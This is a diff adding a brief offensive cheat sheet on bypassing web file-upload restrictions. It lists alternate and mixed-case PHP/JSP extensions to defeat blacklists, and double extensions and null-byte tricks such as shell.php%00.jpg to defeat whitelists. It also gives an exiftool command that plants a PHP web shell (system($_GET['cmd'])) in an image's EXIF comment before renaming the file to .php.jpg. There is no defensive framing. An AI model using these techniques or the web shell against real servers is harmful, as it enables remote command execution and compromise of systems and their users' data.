@@ -1,0 +1,19 @@
+Bypassing File Upload Restrictions
+
+Method 1: Bypassing Blacklisting
+
+1) For PHP, use file extensions such as .pht, .phtml, .php3-6, .inc
+2) For JSP, use extensions such as .jspx, .jspf, .jsw, .jsv
+
+Changing the case of the letter can sometimes work as well, for example, .pHp, .Php, etc.
+
+Method 2: Bypassing Whitelisting
+
+1) For an Apache server, two extensions can be used, for example shell.php.jpg
+2) Use a null byte injection, e.g shell.php%00.jpg or shell.php\x00.jpg
+
+Method 3: Adjust Image Exif Data
+
+Use this command: exiftool -Comment="<?php system($_GET['cmd']); ?>" [Your Image].jpg
+
+Then add a php extension: mv [Your Image].jpg [Your Image].php.jpg
